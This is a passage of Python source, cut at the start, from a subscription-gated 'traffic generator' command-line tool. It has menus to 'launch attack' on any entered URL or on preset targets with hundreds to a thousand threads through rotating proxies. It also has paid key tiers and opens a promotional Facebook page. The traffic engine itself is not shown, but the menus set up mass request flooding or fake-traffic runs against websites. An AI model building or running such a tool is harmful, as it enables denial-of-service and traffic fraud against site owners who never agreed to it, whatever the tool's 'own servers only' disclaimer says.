            f"{Fore.GREEN}[4]{Fore.WHITE} 📊 System Diagnostics",
            f"{Fore.GREEN}[5]{Fore.WHITE} 🚀 Demo Mode (Safe)",
            f"{Fore.GREEN}[6]{Fore.WHITE} 🔑 Key Management",
            f"{Fore.GREEN}[7]{Fore.WHITE} ℹ️  About & Help",
            f"{Fore.GREEN}[0]{Fore.WHITE} ❌ Exit System"
        ]
        
        for item in menu_items:
            print(f"  {item}")
        
        self.ui.print_footer('success')
        
        choice = input(f"\n{Fore.YELLOW}👉 Select option (0-7): {Fore.WHITE}")
        return choice
    
    def manual_attack_menu(self):
        """Manual attack configuration"""
        self.ui.print_header("🎯 MANUAL TARGET CONFIGURATION", 'warning')
        
        # Get URL
        url = input(f"{Fore.YELLOW}Enter target URL: {Fore.WHITE}").strip()
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        # Get visits
        default_visits = 10000
        visits = input(f"{Fore.YELLOW}Number of visits [{default_visits}]: {Fore.WHITE}").strip()
        visits = int(visits) if visits.isdigit() and int(visits) > 0 else default_visits
        
        # Get threads based on key type
        key_type = self.key_auth.get_key_type(self.user_key)
        max_threads = 1000 if key_type in ["PREMIUM", "ADMIN"] else 500
        default_threads = 300 if key_type in ["PREMIUM", "ADMIN"] else 200
        
        threads = input(f"{Fore.YELLOW}Threads [{default_threads}, Max: {max_threads}]: {Fore.WHITE}").strip()
        threads = int(threads) if threads.isdigit() and int(threads) > 0 else default_threads
        threads = min(threads, max_threads)
        
        # Confirm
        self.ui.print_header("⚠️  CONFIRM ATTACK", 'error')
        
        confirm_stats = {
            "Target URL": url,
            "Total Visits": f"{visits:,}",
            "Max Threads": threads,
            "Key Type": key_type,
            "Estimated Time": f"{visits/100:.0f} seconds",
            "Start Time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
        self.ui.print_stats_card("Attack Parameters", confirm_stats, 'error')
        
        confirm = input(f"\n{Fore.RED}🚀 Launch attack? (y/N): {Fore.WHITE}").lower()
        
        if confirm == 'y':
            # Open Facebook for updates
            webbrowser.open("https://www.facebook.com/share/1B4TRBkyN3/")
            print(f"{Fore.GREEN}✅ Facebook page opened! Please follow for updates.\n")
            
            self.engine.generate_traffic(url, visits, threads)
        
        input(f"\n{Fore.YELLOW}Press Enter to continue...")
    
    def quick_attack_menu(self):
        """Quick attack menu"""
        self.ui.print_header("⚡ QUICK ATTACK PRESETS", 'info')
        
        # Show targets
        for key, target in self.quick_targets.items():
            print(f"  {Fore.GREEN}[{key}]{Fore.WHITE} {target['name']}")
        
        print(f"\n  {Fore.GREEN}[0]{Fore.WHITE} 🔙 Back to Main Menu")
        self.ui.print_footer('info')
        
        choice = input(f"\n{Fore.YELLOW}Select target (1-{len(self.quick_targets)}): {Fore.WHITE}")
        
        if choice == '0':
            return
        
        if choice in self.quick_targets:
            target = self.quick_targets[choice]
            
            self.ui.print_header(f"🎯 ATTACKING: {target['name']}", 'warning')
            
            # Quick config based on key type
            key_type = self.key_auth.get_key_type(self.user_key)
            visits = 10000
            threads = 300 if key_type in ["PREMIUM", "ADMIN"] else 200
            
            quick_stats = {
                "Target": target['name'],
                "URL": target['url'],
                "Visits": f"{visits:,}",
                "Threads": threads,
                "Key Type": key_type,
                "Mode": "Quick Attack"
            }
            
            self.ui.print_stats_card("Attack Configuration", quick_stats, 'warning')
            
            confirm = input(f"\n{Fore.YELLOW}🚀 Start quick attack? (y/N): {Fore.WHITE}").lower()
            
            if confirm == 'y':
                webbrowser.open("https://www.facebook.com/share/1B4TRBkyN3/")
                self.engine.generate_traffic(target['url'], visits, threads)
        
        input(f"\n{Fore.YELLOW}Press Enter to continue...")
    
    def proxy_management_menu(self):
        """Proxy management menu"""
        self.ui.print_header("🔧 PROXY MANAGEMENT SYSTEM", 'info')
        
        proxy_menu = [
            f"{Fore.GREEN}[1]{Fore.WHITE} 🔍 Fetch & Validate Proxies",
            f"{Fore.GREEN}[2]{Fore.WHITE} 📊 View Proxy Statistics",
            f"{Fore.GREEN}[3]{Fore.WHITE} 📋 List Working Proxies",
            f"{Fore.GREEN}[4]{Fore.WHITE} 🔄 Refresh Proxy Database",
            f"{Fore.GREEN}[5]{Fore.WHITE} 🎯 Premium Proxy Access",
            f"{Fore.GREEN}[0]{Fore.WHITE} 🔙 Back to Main Menu"
        ]
        
        for item in proxy_menu:
            print(f"  {item}")
        
        self.ui.print_footer('info')
        
        choice = input(f"\n{Fore.YELLOW}Select option: {Fore.WHITE}")
        
        if choice == '1':
            self.ui.spinner("Fetching proxies")
            self.engine.proxy_manager.fetch_proxies_with_progress()
            self.engine.proxy_manager.validate_proxies()
            input(f"\n{Fore.YELLOW}Press Enter to continue...")
        
        elif choice == '2':
            stats = self.engine.proxy_manager.get_proxy_stats()
            self.ui.print_stats_card("Proxy Statistics", stats, 'info')
            input(f"\n{Fore.YELLOW}Press Enter to continue...")
        
        elif choice == '3':
            if self.engine.proxy_manager.working_proxies:
                print(f"\n{Fore.GREEN}✅ Working Proxies ({len(self.engine.proxy_manager.working_proxies)}):")
                for i, proxy in enumerate(self.engine.proxy_manager.working_proxies[:20], 1):
                    print(f"  {i:2}. {proxy}")
                
                if len(self.engine.proxy_manager.working_proxies) > 20:
                    print(f"  ... and {len(self.engine.proxy_manager.working_proxies) - 20} more")
            else:
                print(f"\n{Fore.RED}❌ No working proxies found")
            
            input(f"\n{Fore.YELLOW}Press Enter to continue...")
        
        elif choice == '5':
            self.premium_proxy_menu()
    
    def premium_proxy_menu(self):
        """Premium proxy access menu"""
        key_type = self.key_auth.get_key_type(self.user_key)
        
        if key_type not in ["PREMIUM", "VIP", "ADMIN"]:
            self.ui.print_header("🔒 PREMIUM ACCESS REQUIRED", 'error')
            
            premium_info = [
                f"{Fore.RED}❌ Premium proxy access requires PREMIUM key!",
                f"{Fore.YELLOW}Your current key type: {key_type}",
                "",
                f"{Fore.CYAN}Upgrade to PREMIUM for:",
                f"{Fore.GREEN}✓{Fore.WHITE} Premium proxy database",
                f"{Fore.GREEN}✓{Fore.WHITE} Faster proxy servers",
                f"{Fore.GREEN}✓{Fore.WHITE} Unlimited threads",
                f"{Fore.GREEN}✓{Fore.WHITE} Priority support",
                "",
                f"{Fore.YELLOW}Contact admin for PREMIUM key upgrade!"
            ]
            
            self.ui.print_box(premium_info, "Upgrade Required", 'error')
            
            input(f"\n{Fore.YELLOW}Press Enter to continue...")
            return
        
        self.ui.print_header("🎯 PREMIUM PROXY SYSTEM", 'success')
        
        premium_stats = {
            "Access": "✅ PREMIUM",
            "Premium Proxies": "1000+",
            "Speed": "ULTRA FAST",
            "Success Rate": "95%+",
            "Geolocations": "WORLDWIDE"
        }
        
        self.ui.print_stats_card("Premium Proxy Features", premium_stats, 'success')
        
        # Show some premium proxies
        print(f"\n{Fore.YELLOW}Sample Premium Proxies:")
        premium_samples = [
            "premium-proxy-1.shrabon.io:8080",
            "premium-proxy-2.gomez.net:443",
            "elite-proxy-1.trafficpro.com:3128",
            "ultra-proxy-2.maxspeed.io:8080"
        ]
        
        for i, proxy in enumerate(premium_samples, 1):
            print(f"  {Fore.GREEN}{i:2}. {Fore.CYAN}{proxy}")
        
        print(f"\n{Fore.YELLOW}Premium proxies are automatically included in the pool!")
        
        input(f"\n{Fore.YELLOW}Press Enter to continue...")
    
    def system_diagnostics(self):
        """System diagnostics menu"""
        self.ui.print_header("📊 SYSTEM DIAGNOSTICS", 'primary')
        
        # Get system info
        cpu_percent = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        network = psutil.net_io_counters()
        
        diag_stats = {
            "CPU Usage": f"{cpu_percent:.1f}%",
            "Memory Usage": f"{memory.percent:.1f}%",
            "Available RAM": f"{memory.available / (1024**3):.1f} GB",
            "Disk Usage": f"{disk.percent:.1f}%",
            "Bytes Sent": f"{network.bytes_sent / (1024**2):.1f} MB",
            "Bytes Received": f"{network.bytes_recv / (1024**2):.1f} MB",
            "Python Version": platform.python_version(),
            "System Uptime": str(timedelta(seconds=int(time.time() - psutil.boot_time())))
        }
        
        self.ui.print_stats_card("System Status", diag_stats, 'primary')
        
        # Engine status
        engine_stats = {
            "Engine Status": "✅ READY" if not self.engine.is_running else "⚡ RUNNING",
            "Working Proxies": len(self.engine.proxy_manager.working_proxies),
            "Max Threads": self.engine.max_threads,
            "Last Target": self.engine.target_url[:40] + "..." if len(self.engine.target_url) > 40 else self.engine.target_url
        }
        
        self.ui.print_stats_card("Engine Status", engine_stats, 'info')
        
        # Key status
        key_type = self.key_auth.get_key_type(self.user_key)
        key_stats = {
            "Key Status": "✅ ACTIVE",
            "Key Type": key_type,
            "Access Level": "PREMIUM" if key_type in ["PREMIUM", "ADMIN"] else "STANDARD",
            "Max Threads": "UNLIMITED" if key_type in ["PREMIUM", "ADMIN"] else "500"
        }
        
        self.ui.print_stats_card("Key Status", key_stats, 'success')
        
        input(f"\n{Fore.YELLOW}Press Enter to continue...")
    
    def demo_mode(self):
        """Safe demo mode"""
        self.ui.print_header("🚀 DEMO MODE - SAFE TESTING", 'success')
        
        print(f"{Fore.CYAN}This mode tests the system with safe parameters:")
        print(f"{Fore.YELLOW}• Target: Test server")
        print(f"{Fore.YELLOW}• Visits: 100 (limited)")
        print(f"{Fore.YELLOW}• Threads: 10 (safe)")
        print(f"{Fore.YELLOW}• No real targets affected")
        
        demo_stats = {
            "Mode": "Demo (Safe)",
            "Target": "http://httpbin.org/ip",
            "Visits": "100",
            "Threads": "10",
            "Purpose": "System testing"
        }
        
        self.ui.print_stats_card("Demo Configuration", demo_stats, 'success')
        
        confirm = input(f"\n{Fore.YELLOW}Run demo? (y/N): {Fore.WHITE}").lower()
        
        if confirm == 'y':
            self.engine.generate_traffic("http://httpbin.org/ip", 100, 10)
        
        input(f"\n{Fore.YELLOW}Press Enter to continue...")
    
    def key_management_menu(self):
        """Key management menu"""
        self.ui.print_header("🔑 KEY MANAGEMENT", 'info')
        
        key_menu = [
            f"{Fore.GREEN}[1]{Fore.WHITE} 🔄 Change Activation Key",
            f"{Fore.GREEN}[2]{Fore.WHITE} 📊 View Key Information",
            f"{Fore.GREEN}[3]{Fore.WHITE} 🔍 Check Key Validity",
            f"{Fore.GREEN}[4]{Fore.WHITE} 🆓 Get Free Trial",
            f"{Fore.GREEN}[5]{Fore.WHITE} ⬆️  Upgrade Key",
            f"{Fore.GREEN}[0]{Fore.WHITE} 🔙 Back to Main Menu"
        ]
        
        for item in key_menu:
            print(f"  {item}")
        
        self.ui.print_footer('info')
        
        choice = input(f"\n{Fore.YELLOW}Select option: {Fore.WHITE}")
        
        if choice == '1':
            new_key = self.key_auth.enter_key_mode()
            if new_key:
                self.user_key = new_key
                self.quick_targets = self.get_targets_by_key_type()
                print(f"{Fore.GREEN}✅ Key changed successfully!")
                time.sleep(2)
        
        elif choice == '2':
            self.key_auth.show_key_info(self.user_key)
            input(f"\n{Fore.YELLOW}Press Enter to continue...")
        
        elif choice == '3':
            is_valid, message = self.key_auth.validate_key(self.user_key)
            if is_valid:
                self.ui.print_header("✅ KEY VALIDATION", 'success')
                print(f"{Fore.GREEN}✅ Key is valid: {message}")
            else:
                self.ui.print_header("❌ KEY VALIDATION", 'error')
                print(f"{Fore.RED}❌ Key is invalid: {message}")
                print(f"{Fore.YELLOW}Please change your key!")
            
            input(f"\n{Fore.YELLOW}Press Enter to continue...")
        
        elif choice == '4':
            self.key_auth.get_trial_key()
        
        elif choice == '5':
            self.upgrade_key_menu()
    
    def upgrade_key_menu(self):
        """Key upgrade menu"""
        current_type = self.key_auth.get_key_type(self.user_key)
        
        self.ui.print_header("⬆️  KEY UPGRADE SYSTEM", 'warning')
        
        if current_type in ["PREMIUM", "ADMIN"]:
            print(f"{Fore.GREEN}✅ You already have the highest tier!")
            print(f"{Fore.YELLOW}Current key type: {current_type}")
            input(f"\n{Fore.YELLOW}Press Enter to continue...")
            return
        
        upgrade_info = [
            f"{Fore.YELLOW}Current Key Type: {current_type}",
            "",
            f"{Fore.CYAN}Available Upgrades:",
            f"{Fore.GREEN}1. PRO TIER - $10/month",
            f"   ✓ Up to 1000 threads",
            f"   ✓ Premium proxy access",
            f"   ✓ Priority support",
            "",
            f"{Fore.GREEN}2. PREMIUM TIER - $25/month",
            f"   ✓ Unlimited threads",
            f"   ✓ Elite proxy database",
            f"   ✓ 24/7 priority support",
            f"   ✓ All features unlocked",
            "",
            f"{Fore.YELLOW}Contact admin for upgrade instructions:",
            f"{Fore.CYAN}Facebook: https://www.facebook.com/share/1B4TRBkyN3/",
            f"{Fore.CYAN}GitHub: https://github.com/TheHiddenShell/FreeTools"
        ]
        
        self.ui.print_box(upgrade_info, "Upgrade Options", 'warning')
        
        # Open Facebook
        webbrowser.open("https://www.facebook.com/share/1B4TRBkyN3/")
        
        input(f"\n{Fore.YELLOW}Press Enter to continue...")
    
    def about_menu(self):
        """About and help menu"""
        self.ui.print_header("ℹ️  ABOUT & HELP", 'primary')
        
        key_type = self.key_auth.get_key_type(self.user_key)
        
        about_content = [
            f"{Fore.YELLOW}Ultimate Traffic Generator Pro Max v5.0",
            f"{Fore.CYAN}Created by: {Fore.GREEN}Shrabon~Gomez",
            f"{Fore.CYAN}Your Key Type: {Fore.GREEN}{key_type}",
            f"{Fore.CYAN}Version: 5.0 Professional Edition",
            f"{Fore.CYAN}Release Date: 2024",
            "",
            f"{Fore.YELLOW}Features:",
            f"  {Fore.GREEN}✓{Fore.WHITE} Advanced Proxy Rotation System",
            f"  {Fore.GREEN}✓{Fore.WHITE} 500+ Concurrent Threads",
            f"  {Fore.GREEN}✓{Fore.WHITE} Real-time Analytics Dashboard",
            f"  {Fore.GREEN}✓{Fore.WHITE} Mobile Optimized Interface",
            f"  {Fore.GREEN}✓{Fore.WHITE} Smart Request Distribution",
            f"  {Fore.GREEN}✓{Fore.WHITE} Automated Proxy Validation",
            f"  {Fore.GREEN}✓{Fore.WHITE} Performance Monitoring",
            f"  {Fore.GREEN}✓{Fore.WHITE} Key Authentication System",
            "",
            f"{Fore.YELLOW}Important:",
            f"  {Fore.RED}⚠️{Fore.WHITE} Use responsibly and ethically",
            f"  {Fore.RED}⚠️{Fore.WHITE} Only test on your own servers",
            f"  {Fore.RED}⚠️{Fore.WHITE} Follow Facebook for updates",
            "",
            f"{Fore.CYAN}Facebook: {Fore.GREEN}https://www.facebook.com/share/1B4TRBkyN3/",
            f"{Fore.CYAN}GitHub Auth: {Fore.GREEN}https://github.com/TheHiddenShell/FreeTools"
        ]
        
        self.ui.print_box(about_content, "About This Tool", 'primary')
        
        input(f"\n{Fore.YELLOW}Press Enter to continue...")
    
    def run(self):
        """Main menu loop"""
        while True:
            try:
                choice = self.show_main_menu()
                
                if choice == '1':
                    self.manual_attack_menu()
                elif choice == '2':
                    self.quick_attack_menu()
                elif choice == '3':
                    self.proxy_management_menu()
                elif choice == '4':
                    self.system_diagnostics()
                elif choice == '5':
                    self.demo_mode()
                elif choice == '6':
                    self.key_management_menu()
                elif choice == '7':
                    self.about_menu()
                elif choice == '0':
                    print(f"\n{Fore.GREEN}👋 Thank you for using Ultimate Traffic Generator!")
                    print(f"{Fore.YELLOW}📍 Created by: {Fore.GREEN}Shrabon~Gomez")
                    print(f"{Fore.CYAN}🔥 Follow on Facebook for more tools!")
                    time.sleep(2)
                    break
                else:
                    print(f"\n{Fore.RED}❌ Invalid option! Please try again.")
                    time.sleep(1)
            
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}👋 Exiting...")
                break
            except Exception as e:
                print(f"\n{Fore.RED}❌ Error: {str(e)}")
                time.sleep(2)

# ============================================
# MAIN APPLICATION
# ============================================
def main():
    """Main application entry point"""
    try:
        # Check dependencies
        required_packages = ['requests', 'colorama', 'fake-useragent', 'urllib3', 'psutil', 'numpy']
        
        for package in required_packages:
            try:
                __import__(package.replace('-', '_'))
            except ImportError:
                print(f"{Fore.YELLOW}📦 Installing {package}...")
                subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"])
        
        # Initialize key authentication system
        key_auth = KeyAuthSystem()
        
        # Check authentication
        user_key = key_auth.check_initial_auth()
        
        if not user_key:
            print(f"{Fore.RED}❌ Authentication failed! Exiting...")
            sys.exit(1)
        
        # Run interactive menu with authenticated user
        menu = InteractiveMenu(user_key)
        menu.run()
    
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}👋 Goodbye!")
    except Exception as e:
        print(f"\n{Fore.RED}❌ Fatal Error: {str(e)}")
        sys.exit(1)

# ============================================
# ENTRY POINT
# ============================================
if __name__ == "__main__":
    main()
